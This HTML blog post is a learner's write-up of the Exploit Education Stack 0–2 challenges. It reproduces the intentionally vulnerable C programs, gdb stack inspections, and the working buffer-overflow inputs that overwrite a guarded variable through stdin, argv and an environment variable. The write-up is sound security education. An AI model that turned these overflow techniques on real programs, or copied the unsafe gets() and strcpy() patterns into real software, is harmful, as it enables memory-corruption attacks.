<!DOCTYPE html>
<html lang="en">
  <head>
    <meta name="robots" content="noindex, nofollow">
    <meta charset="UTF-8">
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <title>Exploit Education Writeup Part 1</title>
  </head>
  <body style="max-width: 600px; margin-left: 15px; margin-right: auto;">
    <h1>Exploit Education Writeup Part 1</h1>
    <p>Date: 26 October 2022</p>
    <p>This is part 1 of a writeup for some Exploit Education challenges I completed. In this part I will go over the Stack <strong>0</strong>, <strong>1</strong> and <strong>2</strong> problems.</p>
    <p>I thought it would be fun to complete these exercises, by doing them I was exposed to cool stuff like:</p>
    <ul>
      <li>Binary exploitation</li>
      <li>Learning about common software vulnerabilities</li>
      <li>Exploiting software bugs</li>
      <li>Debugging code</li>
      <li>Learning operating system fundamentals</li>
    </ul>
    <h2>Stack 0 challenge</h2>
    <pre><code>
     #include &lt;stdio.h&gt;
     #include &lt;stdlib.h&gt;
     #include &lt;string.h&gt;
     #include &lt;unistd.h&gt;

     char *gets(char *);

     int main(int argc, char **argv) {
       struct {
	 char buffer[64];
	 volatile int changeme;
       } locals;
       
       locals.changeme = 0;
       gets(locals.buffer);
       
       if (locals.changeme != 0) {
	 puts("Well done, the 'changeme' variable has been changed!");
       } else {
	 puts(
	     "Uh oh, 'changeme' has not yet been changed. Would you like to try "
	     "again?");
       }

       exit(0);
     }
    </code></pre>

    <p>The aim of this challenge is to change the value of the <code>changeme</code> variable inside the struct <code>locals</code>.</p>
    <p>In order to understand how this is done we must first understand how variables are organised in memory.</p>
    <p>Normally structs are organised in the order they are declared, however this is entirely implementation-specific which means it depends on your system, compiler, enviroment etc.</p>
    <p>Just to be sure we will disassemble the program and analyse the stack in gdb.</p>
    <p>First I set the assembly syntax to intel which makes everything easier to read (in my opinion)</p>

    <pre><code>(gdb) set disassembly-flavor intel </code></pre>
    <p>Next I disassembled main() to see where I should set a breakpoint</p>
    <pre><code>
     (gdb) disassemble main 
     Dump of assembler code for function main:
	0x0000000000401176 <+0>:  endbr64 
	0x000000000040117a <+4>:  push   rbp
	0x000000000040117b <+5>:  mov    rbp,rsp
	0x000000000040117e <+8>:  sub    rsp,0x60
	0x0000000000401182 <+12>: mov    DWORD PTR [rbp-0x54],edi
	0x0000000000401185 <+15>: mov    QWORD PTR [rbp-0x60],rsi
	0x0000000000401189 <+19>: mov    rax,QWORD PTR fs:0x28
	0x0000000000401192 <+28>: mov    QWORD PTR [rbp-0x8],rax
	0x0000000000401196 <+32>: xor    eax,eax
	0x0000000000401198 <+34>: mov    DWORD PTR [rbp-0x10],0x0
	0x000000000040119f <+41>: lea    rax,[rbp-0x50]
	0x00000000004011a3 <+45>: mov    rdi,rax
	0x00000000004011a6 <+48>: call   0x401070 &lt;gets@plt&gt;
	0x00000000004011ab <+53>: mov    eax,DWORD PTR [rbp-0x10]
	0x00000000004011ae <+56>: test   eax,eax
	0x00000000004011b0 <+58>: je     0x4011c3 &lt;main+77&gt;
	0x00000000004011b2 <+60>: lea    rax,[rip+0xe4f]        # 0x402008
	0x00000000004011b9 <+67>: mov    rdi,rax
	0x00000000004011bc <+70>: call   0x401060 &lt;puts@plt&gt;
	0x00000000004011c1 <+75>: jmp    0x4011d2 &lt;main+92&gt;
	0x00000000004011c3 <+77>: lea    rax,[rip+0xe76]        # 0x402040
	0x00000000004011ca <+84>: mov    rdi,rax
	0x00000000004011cd <+87>: call   0x401060 &lt;puts@plt&gt;
	0x00000000004011d2 <+92>: mov    edi,0x0
	0x00000000004011d7 <+97>: call   0x401080 &lt;exit@plt&gt;
     End of assembler dump.
    </code></pre>

    <p>I decided to set a breakpoint after the call to <code>gets()</code>, this is because i can give the program some recognisable input such as multiple 'A's and then view where the buffer is positioned in memory.</p>

    <pre><code>
     (gdb) b *0x00000000004011ab
     Breakpoint 1 at 0x4011ab
    </code></pre>

    <p>Now lets run the program and give it 64 'A's (64 because that is the size of buffer inside the struct)</p>
    <pre><code>
     (gdb) r
     Starting program: /home/user/x 
     [Thread debugging using libthread_db enabled]
     Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
     AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

     Breakpoint 1, 0x00000000004011ab in main ()
    </code></pre>

    <p>Now we have hit the breakpoint we set earlier, we should inspect memory</p>
    <pre><code>
     (gdb) x/100x $sp
     0x7fffffffddf0:  0xffffdf68  0x00007fff  0xf7fe285c  0x00000001
     0x7fffffffde00:  0x41414141  0x41414141  0x41414141  0x41414141
     0x7fffffffde10:  0x41414141  0x41414141  0x41414141  0x41414141
     0x7fffffffde20:  0x41414141  0x41414141  0x41414141  0x41414141
     0x7fffffffde30:  0x41414141  0x41414141  0x41414141  0x41414141
     0x7fffffffde40:  0x00000000  0x00000000  0x780e0a00  0xad371c85
    </code></pre>

    <p>One the lines showing values starting from addresses <code>0x7fffffffde00</code> to <code>0x7fffffffde30</code> we can see the hex value for the letter 'A' (41) displayed multiple times. This is our buffer and we can now see the input we gave it.</p>
 
    <p>The next step is to find the changeme variable. If we look back at our code we can see that before the call to <code>gets()</code> the variable <code>changeme</code> was assigned a value of <code>0</code>.</p>
    
    <pre><code>
     locals.changeme = 0;
     gets(locals.buffer);
    </code></pre>

    <p>If we now look back at our memory output we can see <code>0x00000000</code> at address <code>0x7fffffffde40</code> which is after buffer, this may be our variable. Lets try to change the input we give the program to 64 'A's with an additional nonzero value.</p>
    <p>Nice, looks like it worked! we have successfully overwritten <code>changeme</code>.</p>

    <pre><code>
     (gdb) r
     Starting program: /home/user/x 
     [Thread debugging using libthread_db enabled]
     Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
     AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2  

     Breakpoint 1, 0x00000000004011ab in main ()
     (gdb) c
     Continuing.
     Well done, the 'changeme' variable has been changed!
     [Inferior 1 (process 33745) exited normally]
    </code></pre>

    <h2>Stack 1 challenge</h2>
    <pre><code>
     #include &lt;err.h&gt;
     #include &lt;stdio.h&gt;
     #include &lt;stdlib.h&gt;
     #include &lt;string.h&gt;
     #include &lt;unistd.h&gt;

     int main(int argc, char **argv) {
       struct {
	 char buffer[64];
	 volatile int changeme;
       } locals;

       if (argc &lt; 2) {
	 errx(1, "specify an argument, to be copied into the \&quot;buffer\&quot;");
       }

       locals.changeme = 0;
       strcpy(locals.buffer, argv[1]);

       if (locals.changeme == 0x496c5962) {
	 puts("Well done, you have successfully set changeme to the correct value");
       } else {
	 printf("Getting closer! changeme is currently 0x%08x, we want 0x496c5962\n",
	     locals.changeme);
       }

       exit(0);
     }
    </code></pre>

    <p>This challenge requires us to overwrite the <code>changeme</code> variable in the struct <code>locals</code> to the value <code>0x496c5962</code>. Looking at the code we can see that we can give the program input through command line arguments. </p>
    <p>The first argument we provide to the program ( <code>argv[1]</code>) is copied into the buffer named <code>buffer</code> in the struct <code>locals</code> using the <code>strcpy()</code> function. </p>
    <p>Let's begin to solve this challenge:</p>
    <p>As always I like to set the assembly syntax to Intel since I find it easier to read.</p>

    <pre><code>
    (gdb) set disassembly-flavor intel 
    </code></pre>

    <p>Next we can disassemble <code>main()</code> to pinpoint a good line to set a breakpoint at so we can conduct further tests. </p>
    <p>Since <code>strcpy</code> copies our input into the <code>buffer</code> it might be a good idea to break just after it is called and inspect memory. </p>
    
    <pre><code>
     (gdb) disassemble main 
     Dump of assembler code for function main:
	0x00000000004011b6 &lt;+0&gt;:	endbr64 
	0x00000000004011ba &lt;+4&gt;:	push   rbp
	0x00000000004011bb &lt;+5&gt;:	mov    rbp,rsp
	0x00000000004011be &lt;+8&gt;:	sub    rsp,0x60
	0x00000000004011c2 &lt;+12&gt;:	mov    DWORD PTR [rbp-0x54],edi
	0x00000000004011c5 &lt;+15&gt;:	mov    QWORD PTR [rbp-0x60],rsi
	0x00000000004011c9 &lt;+19&gt;:	mov    rax,QWORD PTR fs:0x28
	0x00000000004011d2 &lt;+28&gt;:	mov    QWORD PTR [rbp-0x8],rax
	0x00000000004011d6 &lt;+32&gt;:	xor    eax,eax
	0x00000000004011d8 &lt;+34&gt;:	cmp    DWORD PTR [rbp-0x54],0x1
	0x00000000004011dc &lt;+38&gt;:	jg     0x4011f7 &lt;main+65&gt;
	0x00000000004011de &lt;+40&gt;:	lea    rax,[rip+0xe23]        # 0x402008
	0x00000000004011e5 &lt;+47&gt;:	mov    rsi,rax
	0x00000000004011e8 &lt;+50&gt;:	mov    edi,0x1
	0x00000000004011ed &lt;+55&gt;:	mov    eax,0x0
	0x00000000004011f2 &lt;+60&gt;:	call   0x4010a0 &lt;errx@plt&gt;
	0x00000000004011f7 &lt;+65&gt;:	mov    DWORD PTR [rbp-0x10],0x0
	0x00000000004011fe &lt;+72&gt;:	mov    rax,QWORD PTR [rbp-0x60]
	0x0000000000401202 &lt;+76&gt;:	add    rax,0x8
	0x0000000000401206 &lt;+80&gt;:	mov    rdx,QWORD PTR [rax]
	0x0000000000401209 &lt;+83&gt;:	lea    rax,[rbp-0x50]
	0x000000000040120d &lt;+87&gt;:	mov    rsi,rdx
	0x0000000000401210 &lt;+90&gt;:	mov    rdi,rax
	0x0000000000401213 &lt;+93&gt;:	call   0x401080 &lt;strcpy@plt&gt;
	0x0000000000401218 &lt;+98&gt;:	mov    eax,DWORD PTR [rbp-0x10]
	0x000000000040121b &lt;+101&gt;:	cmp    eax,0x496c5962
	0x0000000000401220 &lt;+106&gt;:	jne    0x401233 &lt;main+125&gt;
	0x0000000000401222 &lt;+108&gt;:	lea    rax,[rip+0xe17]        # 0x402040
   </code></pre>

   <p>We have set a breakpoint after the call to <code>strcpy()</code></p>

    <pre><code>
     (gdb) b *0x0000000000401218
     Breakpoint 1 at 0x401218
    </code></pre>

    <p>Now let's run the program and give it 64 'A's (64 because that is the size of <code>buffer</code>). </p>

    <pre><code>
     (gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
     Starting program: /home/user/x AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
     [Thread debugging using libthread_db enabled]
     Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

     Breakpoint 1, 0x0000000000401218 in main ()
    </code></pre>

    <p>Now we should inspect the stack to see how everything looks. From the output below we can see where our <code>buffer</code> is in memory. Let's now try to overflow the <code>buffer</code> and see what happens. </p>

    <pre><code>
     (gdb) x/100x $sp
     0x7fffffffdda0:	0xffffdf18	0x00007fff	0xf7fe285c	0x00000002
     0x7fffffffddb0:	0x41414141	0x41414141	0x41414141	0x41414141
     0x7fffffffddc0:	0x41414141	0x41414141	0x41414141	0x41414141
     0x7fffffffddd0:	0x41414141	0x41414141	0x41414141	0x41414141
     0x7fffffffdde0:	0x41414141	0x41414141	0x41414141	0x41414141
     0x7fffffffddf0:	0x00000000	0x00000000	0x87cd6e00	0x2cba9a0f
     0x7fffffffde00:	0x00000002	0x00000000	0xf7da9d90	0x00007fff
     0x7fffffffde10:	0x00000000	0x00000000	0x004011b6	0x00000000
     0x7fffffffde20:	0xffffdf00	0x00000002	0xffffdf18	0x00007fff
     0x7fffffffde30:	0x00000000	0x00000000	0x3f8882b8	0x00053a6b
     0x7fffffffde40:	0xffffdf18	0x00007fff	0x004011b6	0x00000000
    </code></pre>

    <p>Let's give the program 64 'A's and 4 '1's</p>
    <pre><code>
     (gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1111
     Starting program: /home/user/x AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1111
     [Thread debugging using libthread_db enabled]
     Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

     Breakpoint 1, 0x0000000000401218 in main ()
    </code></pre>

    <p>Let's see how our memory looks like:</p>

    <pre><code>
     (gdb) x/100x $sp
     0x7fffffffdda0:	0xffffdf18	0x00007fff	0xf7fe285c	0x00000002
     0x7fffffffddb0:	0x41414141	0x41414141	0x41414141	0x41414141
     0x7fffffffddc0:	0x41414141	0x41414141	0x41414141	0x41414141
     0x7fffffffddd0:	0x41414141	0x41414141	0x41414141	0x41414141
     0x7fffffffdde0:	0x41414141	0x41414141	0x41414141	0x41414141
     0x7fffffffddf0:	0x31313131	0x00000000	0x6f85bd00	0x97d1f777
     0x7fffffffde00:	0x00000002	0x00000000	0xf7da9d90	0x00007fff
    </code></pre>

    <p>We can see that below the <code>buffer</code>, starting at address <code>0x7fffffffddf0</code> we have the values <code>0x31313131</code> which are hex values for '1'. Also the program gave us this output: </p>

    <pre><code>
     (gdb) c
     Continuing.
     Getting closer! changeme is currently 0x31313131, we want 0x496c5962
     [Inferior 1 (process 35063) exited normally]
    </code></pre>

    <p>It looks like we have located where the <code>changeme</code> variable is located in memory. Now we just need to replace the '1111' with <code>0x496c5962</code>. </p>
    <p>However we cannot simply give the program 64 'A's + <code>0x496c5962</code>. This would not work due to one small thing: <code>endianness</code>. </p>
    <p>Endianness refers to the order of bytes in a system's memory. There are two main types of endianness and they are big endian and little endian. You can check what byte order your system uses using the <code>lscpu</code> command on Linux.
    <pre><code>
     user@user:~$ lscpu
     Architecture:            x86_64
       CPU op-mode(s):        32-bit, 64-bit
       Address sizes:         48 bits physical, 48 bits virtual
       Byte Order:            Little Endian
    </code></pre>

    <p>Now that we have figured out the byte order of our system, we can begin to solve this problem by giving the program 64 'A's + <code>0x496c5962</code> in little endian order. </p>
    <p>Using <code>printf</code> I printed 64 'A's and the little endian representation of <code>0x496c5962</code> and gave the value to the program. </p>
    <p>Nice, our work here is done.</p>

    <pre><code>
     user@user:~$ printf 'A%.0s' {1..64}; printf '\x62\x59\x6c\x49'
     AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbYlIqasim@ubuntu:~$ 
     user@user:~$ ./x AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbYlI
     Well done, you have successfully set changeme to the correct value
    </code></pre>

    <h2>Stack 2 challenge</h2>
    <pre><code>
     #include &lt;err.h&gt;
     #include &lt;stdio.h&gt;
     #include &lt;stdlib.h&gt;
     #include &lt;string.h&gt;
     #include &lt;unistd.h&gt;

     int main(int argc, char **argv) {
       struct {
	 char buffer[64];
	 volatile int changeme;
       } locals;

       char *ptr;

       ptr = getenv("ExploitEducation");
       if (ptr == NULL) {
	 errx(1, "please set the ExploitEducation environment variable");
       }

       locals.changeme = 0;
       strcpy(locals.buffer, ptr);

       if (locals.changeme == 0x0d0a090a) {
	 puts("Well done, you have successfully set changeme to the correct value");
       } else {
	 printf("Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n",
	     locals.changeme);
       }

       exit(0);
     }
    </code></pre>

    <p>This challenge is similar to the previous challenges. In this one we have to change the value of <code>changeme</code>.</p>

    <p>The first step is to examine the code. We can see that the program uses <code>getenv</code> and saves the return value in a character pointer called <code>ptr</code> to then later check if <code>getenv</code> failed. Let's run the program and see what we get. </p>
    
    <pre><code>
     user@user:~$ ./x 
     x: please set the ExploitEducation environment variable
    </code></pre>

    <p>As expected we got an error because there is no 'ExploitEducation' environment variable, so let's add one with the Linux <code>export</code> command and assign it a random value. </p>
    <pre><code>
     user@user:~$ export ExploitEducation="AAAAAAAAAA" 
    </code></pre>

    <p>Running the program again gives us this:</p>
    <pre><code>
     user@user:~$ ./x 
     Almost! changeme is currently 0x00000000, we want 0x0d0a090a
    </code></pre>

    <p>Looking at the code again we can see that <code>strcpy</code> is used to copy the value of <code>ptr</code> (our environment variable) into the buffer named <code>buffer</code>. If we set the value of <code>ExploitEducation</code> to something greater than the size of <code>buffer</code> we could potentially overflow it and change the value of <code>changeme</code>. Let's try that out: </p>
        
    <pre><code>
     user@user:~$ export ExploitEducation=$(printf 'A%.0s' {1..64}; printf '\x0a\x09\x0a\x0d')
     user@user:~$ ./x 
     Well done, you have successfully set changeme to the correct value
    </code></pre>

    <p>Nice, we have done it!</p>

   <h2>Conclusion</h2>

   <p>These challenges have provided valuable insights into buffer overflow exploits and the importance of understanding memory management and software vulnerabilities. By completing Stack 0, 1, and 2, I have gained hands-on experience in binary exploitation, debugging, and leveraging common software bugs to manipulate program behavior.</p>
    
   <p>In Part 2 of this writeup, I will tackle Stack 3, 4, and 5 challenges, further deepening my knowledge in binary exploitation and software security.</p>

  </body>
</html>
